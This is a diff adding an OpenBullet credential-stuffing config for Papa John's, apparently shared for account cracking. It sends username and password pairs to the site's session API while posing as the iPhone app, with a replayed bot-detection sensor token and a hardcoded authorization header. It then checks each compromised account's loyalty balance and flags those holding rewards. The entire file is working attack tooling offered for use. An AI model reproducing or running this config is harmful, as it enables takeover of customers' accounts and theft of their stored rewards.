@@ -1,0 +1,94 @@
+[SETTINGS]
+{
+  "Name": "PapaJohns",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2020-03-01T01:35:44.5690774-08:00",
+  "AdditionalInfo": "",
+  "Author": "The Architect",
+  "Version": "1.4.2 [Anomaly] x64",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://www.papajohns.com/api/v3/sessions" 
+  CONTENT "{\"email\":\"<USER>\",\"rememberMe\":true,\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: www.papajohns.com" 
+  HEADER "Content-Type: application/json" 
+  HEADER "pj-client-app: IPHONE" 
+  HEADER "X-acf-sensor-data: 1,i,t5PnnzbWAyYLOr18/4NLd/ZhhJCo4Ha6nCju3E/00wApA4tb9YJqgxoJw/UAbx7sOAq0rPhFsEWk6zPYAuN52rDcYDlGQIWDWUzdwNkemWy82jTYF/fVQqBojRpJsu/0foLBfqWjKKxVW2C333XrUpwVPyY3vuo9asiB1LBJr68=,S4cZ/mdCdqK2dQd3iOa1OrENEDq5EEVlkcAZhgwfBNzzOwTdCKOJtdxDUVNM7pWgXNna0DWO55syZv7oKCMtBDK/LEmwjHjGybStSBncFMQknZyIxajBjmkPTTQCZC5L3pnbt8mWYLR4JcUoQUp0bURqeKr2ljIjEMXNy5iQW2s=$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$42,12,60" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Accept: application/json" 
+  HEADER "Accept-Language: en-us" 
+  HEADER "Content-Length: 80" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "User-Agent: PJ4.38.1.12022/12022 CFNetwork/1121.2.2 Darwin/19.3.0" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "This email and/or password is not currently valid" 
+  KEYCHAIN Success OR 
+    KEY "customerToken" 
+
+PARSE "<SOURCE>" JSON "customerId" -> VAR "CID" 
+
+REQUEST GET "https://www.papajohns.com/api/v4/loyalty/balance/<CID>?storeId=4037" 
+  
+  HEADER "Host: www.papajohns.com" 
+  HEADER "Content-Type: application/json" 
+  HEADER "pj-client-app: IPHONE" 
+  HEADER "pj-authorization: YWE3NmZjNzYtMjkzNS00YjBmLWEwNmYtODdkNGVlY2MyMzVlSkUnKixfR0gsKg==" 
+  HEADER "Accept: application/json" 
+  HEADER "Accept-Language: en-us" 
+  HEADER "User-Agent: PJ4.38.1.12022/12022 CFNetwork/1121.2.2 Darwin/19.3.0" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Connection: keep-alive" 
+
+PARSE "<SOURCE>" JSON "bankedRewards" -> CAP "Dough" "$" "" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "\"bankedRewards\":\"0.00" 
+    KEY "Access is denied" 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" DoesNotContain "\"bankedRewards\":\"0.00" 
+
